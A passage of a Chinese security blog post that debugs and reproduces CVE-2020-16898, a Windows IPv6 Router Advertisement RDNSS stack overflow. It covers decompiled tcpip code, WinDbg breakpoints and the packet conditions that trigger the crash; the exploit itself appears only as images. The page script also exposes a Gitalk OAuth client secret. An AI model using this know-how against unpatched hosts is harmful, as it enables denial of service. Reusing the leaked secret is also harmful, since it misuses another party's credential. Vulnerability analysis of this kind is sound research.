<p>这条堆栈，所以一定是Ipv6pHandleRouterAdvertisement函数触发了GS的检查，因为是进行GS检查后才进行pop出去返回地址，由这里可以继续分析。</p>
<p><code>Ipv6pHandleRouterAdvertisement</code>函数存在两个循环，第一个循环遍历所有headers，做一些基本的验证，如length的大小，第二个循环用于处理包，并且该阶段不再验证。</p>
<p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201113232618155.png" alt="image-20201113232618155"></p>
<p>结合其他的分析文档以及使用windbg下断点分析，可以确定<code>Ipv6pHandleRouterAdvertisement</code>函数为发生溢出的函数。</p>
<p>继续分析可知是由于<code>Ipv6pUpdateRDNSS</code>函数造成的。确切原因是当length字段为偶数时，<code>Ipv6pUpdateRDNSS</code>函数未按预期调整网络缓冲区指针。</p>
<p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201113202559941.png" alt="image-20201113202559941"></p>
<h3 id="漏洞函数"><a href="#漏洞函数" class="headerlink" title="漏洞函数"></a>漏洞函数</h3><p><code>tcpip!Ipv6pHandleRouterAdvertisement</code>可以分为两个大while，可以作为两次对于包的处理。第一次对于包的处理是正确的，第二次在解析option结构时，计算长度的算法出错了，造成了读取到了错误的Type，进而伪造了一个option。</p>
<p>借用两个图来说明这个过程。在第一次循环中，正确的解析了Length如果是4的情况下，</p>
<p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201115004113432.png" alt="image-20201115004113432"></p>
<p>正如上面EXP流量数据包中的数据。</p>
<p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201115004311281.png" alt="image-20201115004311281"></p>
<p>在经历过<code>Ipv6pUpdateRDNSS</code>函数后，偏移量的指针出现了8字节的错误。所以后八个字节被解析成了option。</p>
<p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/Visualization-loop-2-PoC-BSOD-for-CVE-2020-16898.png" alt="img"></p>
<p>对照EXP流量数据包中。</p>
<p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201115004523469.png" alt="image-20201115004523469"></p>
<p>两个循环简化的代码如下：</p>
<pre class="line-numbers language-c++"><code class="language-c++">  while ( 1 )
  {
    switch ( v25 )
    {
      case 1u:
        // 省略
      case 3u:
       // 省略
      case 0x18u:
        v222[0] = 0i64;
        v222[1] = 0i64;
        v222[2] = 0i64;
        if ( v29 > 0x18u
          || (v145 = *((_BYTE *)NdisGetDataBuffer(v9, v29, v222, 1u, 0) + 2), v145 > 0x80u)
          || v145 > 0x40u && v29 < 0x18u
          || v145 && v29 < 0x10u )
        {
          *a3 = 24;
          goto LABEL_275;
        }
        break;
      case 0x19u:
        if ( (*(_BYTE *)(v11 + 404) & 0x40) != 0 && v29 < 0x18u )
          *a3 = 25;
        break;
      default:
        if ( v25 == 31 && (*(_BYTE *)(v11 + 404) & 0x40) != 0 && v29 < 0x10u )
        {
          *a3 = 26;
LABEL_275:
          v27 = v9->DataLength;
          goto LABEL_33;
        }
        break;
    }
         // 省略
        while ( 1 )
        {
         // 省略
          if ( *v75 == 0x18 )
          {
            v77 = 8 * (unsigned __int8)v75[1];
            v223[0] = 0i64;
            v223[1] = 0i64;
            v223[2] = 0i64;
            v220[0] = 0i64;
            v220[1] = 0i64;
            v154 = (unsigned __int8 *)NdisGetDataBuffer(v69, v76, v223, 1u, 0);
            v227 = _mm_load_si128((const __m128i *)&_xmm);
            v176 = v227.m128i_u32[((unsigned __int64)v154[3] >> 3) & 3];
            if ( v176 != -1 )
            {
              v155 = v154[2];
              v156 = _byteswap_ulong(*((_DWORD *)v154 + 1));
              v157 = 2 * v156;
              if ( (2 * v156) >> 1 != v156 )
                v157 = -1;
              CopyPrefix(v220, v154 + 8, v154[2], 16i64);
              IppUpdateAutoConfiguredRoute(v11, (_DWORD)Buf2, v65, (unsigned int)v220, v155, v157, v176);
              v73 = v171;
              if ( v64 <= v157 )
                v157 = v64;
              v64 = v157;
            }
            goto LABEL_115;
          }
          if ( *v75 == 0x19 )
          {
            if ( (*(_BYTE *)(v11 + 404) & 0x40) != 0 )
            {
              Ipv6pUpdateRDNSS(v11, v69, Buf2, v191, &v172);
              goto LABEL_309;
            }
          }
          else if ( *v75 == 0x1F && (*(_BYTE *)(v11 + 404) & 0x40) != 0 )
          {
            Ipv6pUpdateDNSSL(v11, v69, Buf2, (unsigned int)v191, &v172);
LABEL_309:
            v77 = v168;
            goto LABEL_118;
          }
LABEL_114:
// 省略
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>第一个循环中判断的case:0x19 第一次循环会进入这里，这里读取长度时是正确的。</p>
<p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201114232618024.png" alt="image-20201114232618024"></p>
<p>继续分析第二个while Ipv6pUpdateRDNSS函数。由上述资料可以得到 NdisGetDataBuffer 返回了RDNSS option的结构指针，该结构+1字节以后正是Length的地址，后根据公式计算出有多少个地址。 </p>
<p><code>NetioAdvanceNetBuffer</code> 函数的作用是 将 NET_BUFFER 结构中的DataOffset与参数2相加，代表偏移增加。</p>
<p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201113222439361.png" alt="image-20201113222439361"></p>
<p>通过交叉引用可以分析出v37 是下面while的次数。这个漏洞的原因就是计算Length算法存在问题，上文中已经分析过，如果v9+1指向的内存的数据(也就是Length)是偶数时，将会触发漏洞。</p>
<p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201113222900308.png" alt="image-20201113222900308"></p>
<p>而v34是进行比较的值，对v34进行分析引用，v34是循环次数，但是由于v37的计算错误，所以循环会造成少一次。</p>
<p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201115001438387.png" alt="image-20201115001438387"></p>
<p>下面开始进入了while的循环。</p>
<p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201113223905055.png" alt="image-20201113223905055"></p>
<p>这里可以观察到NetioAdvanceNetBuffer(v16, 0x10u);这句代码的意思是DataOffset += 0x10 ，但是由上文可知。在为偶数时，会发生少循环一轮，DataOffset就会少计算一次，这时返回到了上层函数tcpip!Ipv6pHandleRouterAdvertisement的第二个while循环中，读取了伪造的type 进入了case:0x18，伪造的Length在调用 NdisGetDataBuffer 函数后，导致栈溢出的发生。位置如下图：</p>
<p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201115003106997.png" alt="image-20201115003106997"></p>
<p>假设<code>Ipv6pHandleRouterAdvertisement</code>中的第一个判断 Packet的循环认为Options应该是 4*8 = 0x20偏移，但<code>Ipv6pUpdateRDNSS</code>认为下一个Options在0x18处执行结束后，从0x18处读取 Options 这里是没有经过Packet安全校验的，其Type可以是任意值，且如果Packet是分包，内容不在一个包里，进入了0x18 <code>NdisGetDataBuffer</code>函数读取到其他内容，也会把数据复制到参数3里才导致的栈溢出。<br>总结上述过程，这个问题本质是 Ipv6pUpdateRDNSS 计算错误了。没有其他漏洞配合，CVE-2020-16898是无法直接造成RCE的。</p>
<h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><p>先记录一下造成crash的数据包格式。</p>
<p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201114224536554.png" alt="image-20201114224536554"></p>
<p>后续在调试中可以观察到这个数据包在内存中的变化。</p>
<p>设置几个断点</p>
<pre><code>bp tcpip!Ipv6pHandleRouterAdvertisement            // 
bp tcpip!Ipv6pHandleRouterAdvertisement + 0xB85D9  // 第一次while中 case 0x18
bp tcpip!Ipv6pHandleRouterAdvertisement + 0xB85FB  // 第一次while中 case 0x19
bp tcpip!Ipv6pHandleRouterAdvertisement + 0xB8A2A  // 第二次while中 case 0x18
bp tcpip!Ipv6pHandleRouterAdvertisement + 0xB8A50  // 第二次while中 case  0x19 
bp tcpip!Ipv6pHandleRouterAdvertisement + 0xB8A89 //  漏洞位置
bp tcpip!Ipv6pUpdateRDNSS + 0x7F // 第一次执行NdisGetDataBuffer函数
bp tcpip!Ipv6pUpdateRDNSS + 0x94 // 第一次执行NetioAdvanceNetBuffer函数
bp tcpip!Ipv6pUpdateRDNSS + 0xAC // 长度计算 v37 = (*((unsigned __int8 *)v9 + 1) - 1) / 2;
bp tcpip!Ipv6pUpdateRDNSS + 0x15C // while中的NdisGetDataBuffer函数
bp tcpip!Ipv6pUpdateRDNSS + 0x177 // while中的 NetioAdvanceNetBuffer </code></pre><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201115005655715.png" alt="image-20201115005655715"></p>
<p>命中第一次while中的断点</p>
<p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201115005916039.png" alt="image-20201115005916039"></p>
<p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201115010133278.png" alt="image-20201115010133278"></p>
<p>第一次进入</p>
<p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201115010444370.png" alt="image-20201115010444370"></p>
<p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201115010315783.png" alt="image-20201115010315783"></p>
<p>第一次执行<code>NdisGetDataBuffer</code>函数之前，查看net_buffer结构，发现CurrentMdlOffset的偏移是0x10同时查看数据包的数据。</p>
<p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201115011451109.png" alt="image-20201115011451109"></p>
<p>可以观察到wireshark抓到的数据包出现在了内存里。</p>
<p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201115012131530.png" alt="image-20201115012131530"></p>
<p>经历过NetioAdvanceNetBuffer函数之后，指针前进了8指向了Recursive DNS Servers。</p>
<p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201115012252209.png" alt="image-20201115012252209"></p>
<p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201115012549322.png" alt="image-20201115012549322"></p>
<p>查看一下循环次数。这里的v37是对应的eax，到windbg查看一下值是多少。（8 - 1）/2 = 3 符合计算。</p>
<p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201115012835946.png" alt="image-20201115012835946"></p>
<p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201115012924873.png" alt="image-20201115012924873"></p>
<p>继续运行。到达了循环中的<code>NdisGetDataBuffer</code>函数的调用处。这次观察一下返回值。返回值是第一个Recursive DNS Server值的地址。</p>
<p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201115013410360.png" alt="image-20201115013410360"></p>
<p>再继续的时候到达了<code>NetioAdvanceNetBuffer</code>函数，这时操作指针加了0x10。</p>
<p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201115013504624.png" alt="image-20201115013504624"></p>
<p> <img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201115013748482.png" alt="image-20201115013748482"></p>
<p>循环3次后指针变为<code>0x10 + 0x8 + 0x10*3  = 0x48</code>，结合wireshark的数据包可知指向的位置为伪造的结构处。</p>
<p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201115013919186.png" alt="image-20201115013919186"></p>
<p><code>bp tcpip!Ipv6pHandleRouterAdvertisement + 0xB8A35</code> 在这个函数的返回位置下一个断点，然后等待断下。</p>
<p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201115014242266.png" alt="image-20201115014242266"></p>
<p>再次进入了0x18的case。<code>bp tcpip!Ipv6pHandleRouterAdvertisement + 0xB8A89</code> 在崩溃函数下断点。</p>
<p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201115014605604.png" alt="image-20201115014605604"></p>
<p>查看<code>CurrentMdlOffset</code>值确实是0x48符合上面的推算。</p>
<p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201115015559101.png" alt="image-20201115015559101"></p>
<p>查看具体的数据。</p>
<p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201115015743747.png" alt="image-20201115015743747"></p>
<p>由第二个字节计算长度是<code>a0 * 8 = 0x500</code>，查看rdx的值。</p>
<p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201115020435308.png" alt="image-20201115020435308"></p>
<p>在这个函数中会发生复制。先查看一次堆栈。</p>
<p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201115021014263.png" alt="image-20201115021014263"></p>
<p>执行步过，再次查看栈。</p>
<p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201115021001732.png" alt="image-20201115021001732"></p>
<p>再次g运行之后发生了崩溃。</p>
<p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201115014445378.png" alt="image-20201115014445378"></p>
<h2 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h2><p>使用wireshark分析流量包。type为0x19 对应了上面分析时确定的case，length为偶数，可以观察到Recursive DNS Servers解析是错误的。</p>
<p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201114011222194.png" alt="image-20201114011222194"></p>
<p>明显的观察到解析已经出错了，本应作为下一个开头的icmp包出现了错误。</p>
<p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201114011531014.png" alt="image-20201114011531014"></p>
<h1 id="完成exp"><a href="#完成exp" class="headerlink" title="完成exp"></a>完成exp</h1><p>数据包构造只要满足几个条件即可。</p>
<p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201115015138270.png" alt="image-20201115015138270"></p>

            </div>
            <hr />

            
            <style>
    #reward {
        margin: 40px 0;
        text-align: center;
    }

    #reward .reward-link {
        font-size: 1.88rem;
    }

    #reward .btn-floating:hover {
        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
    }

    #rewardModal {
        width: 320px;
        height: 350px;
    }

    #rewardModal .reward-title {
        margin: 15px auto;
        padding-bottom: 5px;
    }

    #rewardModal .modal-content {
        padding: 10px;
    }

    #rewardModal .close {
        position: absolute;
        right: 15px;
        top: 15px;
        color: rgba(0, 0, 0, 0.5);
        font-size: 1.3rem;
        line-height: 20px;
        cursor: pointer;
    }

    #rewardModal .close:hover {
        color: #ef5350;
        transform: scale(1.3);
        -moz-transform:scale(1.3);
        -webkit-transform:scale(1.3);
        -o-transform:scale(1.3);
    }

    #rewardModal .reward-tabs {
        margin: 0 auto;
        width: 210px;
    }

    .reward-tabs .tabs {
        height: 38px;
        margin: 10px auto;
        padding-left: 0;
    }

    .reward-content ul {
        padding-left: 0 !important;
    }

    .reward-tabs .tabs .tab {
        height: 38px;
        line-height: 38px;
    }

    .reward-tabs .tab a {
        color: #fff;
        background-color: #ccc;
    }

    .reward-tabs .tab a:hover {
        background-color: #ccc;
        color: #fff;
    }

    .reward-tabs .wechat-tab .active {
        color: #fff !important;
        background-color: #22AB38 !important;
    }

    .reward-tabs .alipay-tab .active {
        color: #fff !important;
        background-color: #019FE8 !important;
    }

    .reward-tabs .reward-img {
        width: 210px;
        height: 210px;
    }
</style>

<div id="reward">
    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-large waves-effect waves-light red">赏</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close modal-close"><i class="fa fa-close"></i></a>
            <h4 class="reward-title">写作不易，客官能否打赏一杯奶茶？</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs row">
                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                    </ul>
                    <div id="alipay">
                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
                    </div>
                    <div id="wechat">
                        <img src="/medias/reward/wechat.jpg" class="reward-img" alt="微信打赏二维码">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('.tabs').tabs();
    });
</script>
            

            <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">

<div id="article-share">
    
    <div class="social-share" data-disabled="qzone" data-wechat-qrcode-helper="<p>微信里点“发现”->“扫一扫”二维码便可查看分享。</p>"></div>
    
</div>

<script src="/libs/share/js/social-share.min.js"></script>

            

    <div class="reprint" id="reprint-statement">
        <p class="reprint-tip">
            <i class="fa fa-exclamation-triangle"></i>&nbsp;&nbsp;
            <span>转载规则</span>
        </p>
        
            <div class="center-align">
                <a rel="license" href="https://creativecommons.org/licenses/by/4.0/deed.zh">
                    <img alt=""
                         style="border-width:0"
                         src="https://i.creativecommons.org/l/by/4.0/88x31.png"/>
                </a>
            </div>
            <br/>
            <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text"
                  property="dct:title" rel="dct:type">
                    《CVE-2020-16898调试复现记录》
                </span> 由
            <a xmlns:cc="http://creativecommons.org/ns#" href="/2020/11/10/cve-2020-16898-diao-shi-fu-xian-ji-lu/" property="cc:attributionName"
               rel="cc:attributionURL">
                Hook
            </a> 采用
            <a rel="license" href="https://creativecommons.org/licenses/by/4.0/deed.zh">
                知识共享署名 4.0 国际许可协议
            </a>进行许可。
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>


        </div>
    </div>

    
    <link rel="stylesheet" href="/libs/gitalk/gitalk.css">
<link rel="stylesheet" href="/css/my-gitalk.css">

<div class="card gitalk-card" data-aos="fade-up">
    <div id="gitalk-container" class="card-content"></div>
</div>

<script src="/libs/gitalk/gitalk.min.js"></script>
<script>
    let gitalk = new Gitalk({
        clientID: '2e1be45208be04f8d280',
        clientSecret: 'f62b199aae13e93412d69c241388c1324ee88c06',
        repo: 'h01k.github.io',
        owner: 'H01k',
        admin: "H01k",
        id: '2020/11/10/cve-2020-16898-diao-shi-fu-xian-ji-lu/',
        distractionFreeMode: false  // Facebook-like distraction free mode
    });

    gitalk.render('gitalk-container');
</script>
    

    

    

    

    
    <style>
    .valine-card {
        margin: 1.5rem auto;
    }

    .valine-card .card-content {
        padding: 20px 20px 5px 20px;
    }

    #vcomments input[type=text],
    #vcomments input[type=email],
    #vcomments input[type=url],
    #vcomments textarea {
        box-sizing: border-box;
    }

    #vcomments p {
        margin: 2px 2px 10px;
        font-size: 1.05rem;
        line-height: 1.78rem;
    }

    #vcomments blockquote p {
        text-indent: 0.2rem;
    }

    #vcomments a {
        padding: 0 2px;
        color: #42b983;
        font-weight: 500;
        text-decoration: underline;
    }

    #vcomments img {
        max-width: 100%;
        height: auto;
        cursor: pointer;
    }

    #vcomments ol li {
        list-style-type: decimal;
    }

    #vcomments ol,
    ul {
        display: block;
        padding-left: 2em;
        word-spacing: 0.05rem;
    }

    #vcomments ul li,
    ol li {
        display: list-item;
        line-height: 1.8rem;
        font-size: 1rem;
    }

    #vcomments ul li {
        list-style-type: disc;
    }

    #vcomments ul ul li {
        list-style-type: circle;
    }

    #vcomments table, th, td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    #vcomments table, th, td {
        border: 0;
    }

    table tr:nth-child(2n), thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments h1 {
        font-size: 1.85rem;
        font-weight: bold;
        line-height: 2.2rem;
    }

    #vcomments h2 {
        font-size: 1.65rem;
        font-weight: bold;
        line-height: 1.9rem;
    }

    #vcomments h3 {
        font-size: 1.45rem;
        font-weight: bold;
        line-height: 1.7rem;
    }

    #vcomments h4 {
        font-size: 1.25rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    #vcomments h5 {
        font-size: 1.1rem;
        font-weight: bold;
        line-height: 1.4rem;
    }

    #vcomments h6 {
        font-size: 1rem;
        line-height: 1.3rem;
    }

    #vcomments p {
        font-size: 1rem;
        line-height: 1.5rem;
    }

    #vcomments hr {
        margin: 12px 0;
        border: 0;
        border-top: 1px solid #ccc;
    }

    #vcomments blockquote {
        margin: 15px 0;
        border-left: 5px solid #42b983;
        padding: 1rem 0.8rem 0.3rem 0.8rem;
        color: #666;
        background-color: rgba(66, 185, 131, .1);
    }

    #vcomments pre {
        font-family: monospace, monospace;
        padding: 1.2em;
        margin: .5em 0;
        background: #272822;
        overflow: auto;
        border-radius: 0.3em;
        tab-size: 4;
    }

    #vcomments code {
        font-family: monospace, monospace;
        padding: 1px 3px;
        font-size: 0.92rem;
        color: #e96900;
        background-color: #f8f8f8;
        border-radius: 2px;
    }

    #vcomments pre code {
        font-family: monospace, monospace;
        padding: 0;
        color: #e8eaf6;
        background-color: #272822;
    }

    #vcomments pre[class*="language-"] {
        padding: 1.2em;
        margin: .5em 0;
    }

    #vcomments code[class*="language-"],
    pre[class*="language-"] {
        color: #e8eaf6;
    }

    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }

    #vcomments b,
    strong {
        font-weight: bold;
    }

    #vcomments dfn {
        font-style: italic;
    }

    #vcomments small {
        font-size: 85%;
    }

    #vcomments cite {
        font-style: normal;
    }

    #vcomments mark {
        background-color: #fcf8e3;
        padding: .2em;
    }

    #vcomments table, th, td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    table tr:nth-child(2n), thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }
</style>

<div class="card valine-card" data-aos="fade-up">
    <div id="vcomments" class="card-content"></div>
</div>

<script src="/libs/valine/av-min.js"></script>
<script src="/libs/valine/Valine.min.js"></script>
<!-- <script src="//unpkg.com/valine@latest/dist/Valine.min.js"></script> -->

<script>
    new Valine({
        el: '#vcomments',
        appId: '',
        appKey: '',
        notify: 'false' === 'true',
        verify: 'false' === 'true',
        visitor: 'false' === 'true',
        avatar: 'wavatar',
        pageSize: '10',
        lang: 'zh-cn',
        placeholder: '如果你没有GitHub账号，还可以在这里评论啦！'
    });
</script>

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
            </div>
            <div class="card">
                <a href="/2020/11/10/cve-2020-16898-diao-shi-fu-xian-ji-lu/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="CVE-2020-16898调试复现记录">
                        
                        <span class="card-title">CVE-2020-16898调试复现记录</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            CVE-2020-16898
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-11-10
                            </span>
                        <span class="publish-author">
                            
                        </span>
                    </div>
                </div>

                
                <div class="card-action article-tags">
                    
                    <a href="/tags/CVE/" target="_blank">
                        <span class="chip bg-color">CVE</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2020/11/03/pwn-lian-xi-ji-lu/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="PWN练习记录">
                        
                        <span class="card-title">PWN练习记录</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            PWN
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-11-03
                            </span>
                        <span class="publish-author">
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/PWN/" target="_blank">
                        <span class="chip bg-color">PWN</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>
</div>


<script>
    $('#articleContent').on('copy', function (e) {
        // IE8 or earlier browser is 'undefined'
        if (typeof window.getSelection === 'undefined') return;

        var selection = window.getSelection();
        // if the selection is short let's not annoy our users.
        if (('' + selection).length < Number.parseInt('120')) {
            return;
        }

        // create a div outside of the visible area and fill it with the selected text.
        var bodyElement = document.getElementsByTagName('body')[0];
        var newdiv = document.createElement('div');
        newdiv.style.position = 'absolute';
        newdiv.style.left = '-99999px';
        bodyElement.appendChild(newdiv);
        newdiv.appendChild(selection.getRangeAt(0).cloneContents());

        // we need a <pre> tag workaround.
        // otherwise the text inside "pre" loses all the line breaks!
        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
        }

        var url = document.location.href;
        newdiv.innerHTML += '<br />'
            + '来源: Hook的博客<br />'
            + '作者: Hook<br />'
            + '链接: <a href="' + url + '">' + url + '</a><br />'
            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';

        selection.selectAllChildren(newdiv);
        window.setTimeout(function () { bodyElement.removeChild(newdiv); }, 200);
    });
</script>

    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget">
            <div class="toc-title"><i class="fa fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fa fa-list"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
